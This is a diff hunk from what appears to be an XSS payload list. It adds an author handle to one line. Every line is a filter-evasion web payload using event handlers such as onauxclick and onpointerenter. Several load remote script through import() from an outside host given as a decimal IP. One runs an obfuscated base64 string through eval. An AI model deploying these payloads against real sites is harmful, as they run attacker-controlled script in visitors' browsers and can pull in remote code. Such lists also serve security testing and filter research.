@@ -5,7 +5,7 @@
 "%3balert`1`%3b"
 asd"`> onpointerenter=x=prompt,x`XSS`
 <x onauxclick=import('//1152848220/')>click
-<x onauxclick=a=alert,a(domain)>click
+<x onauxclick=a=alert,a(domain)>click -@niksthehacker
 <x onauxclick=import('//1152848220/')>click
 <x onauxclick=import('//xss/')>click
 \"<>onauxclick<>=(eval)(atob(`YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==`))>+<sss
